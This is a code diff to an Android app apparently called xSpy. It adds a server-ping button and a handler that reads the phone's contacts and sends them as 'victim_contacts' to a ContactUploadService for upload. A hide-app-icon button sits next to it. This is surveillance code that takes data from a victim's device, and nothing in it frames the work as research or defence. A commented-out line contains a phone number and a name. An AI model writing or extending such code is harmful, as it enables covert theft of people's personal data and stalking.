@@ -9,14 +9,17 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 
+import androidx.lifecycle.Observer;
 import androidx.lifecycle.ViewModelProvider;
 
+import com.google.gson.JsonElement;
 import com.karumi.dexter.Dexter;
 import com.karumi.dexter.MultiplePermissionsReport;
 import com.karumi.dexter.PermissionToken;
 import com.karumi.dexter.listener.PermissionRequest;
 import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
 import com.redeyesncode.xspy.backend.AndroidContactModel;
+import com.redeyesncode.xspy.backend.services.ContactUploadService;
 import com.redeyesncode.xspy.backend.services.FileUploadService;
 import com.redeyesncode.xspy.base.BaseActivity;
 import com.redeyesncode.xspy.databinding.ActivityMainBinding;
@@ -51,10 +54,22 @@ public class MainActivity extends BaseActivity {
     }
 
     private void attachObservers() {
+        mainViewModel.jsonElementLiveData().observe(this, jsonElement -> {
+//            {"status":"success","code":200,"message":"Hello xSPY !"}
+            showToast(jsonElement.getAsJsonObject().get("message").getAsString());
+
+        });
 
     }
 
     private void initClicks() {
+
+        binding.btnPingServer.setOnClickListener(v->{
+            mainViewModel.helloServer();
+
+
+        });
+
         binding.btnGetPermission.setOnClickListener(v -> {
             checkPermissions();
         });
@@ -63,8 +78,11 @@ public class MainActivity extends BaseActivity {
             // How to call api's in android in background thread.
 
             ArrayList<AndroidContactModel> contacts = Utils.getContactList(MainActivity.this);
+//            mainViewModel.dumpContact("6261319133","Ashu");
+            Intent intent = new Intent(this, ContactUploadService.class);
+            intent.putExtra("victim_contacts", (ArrayList<AndroidContactModel>) contacts);
 
-
+            startService(intent);
         });
 
         binding.btnHideAppIcon.setOnClickListener(v->{
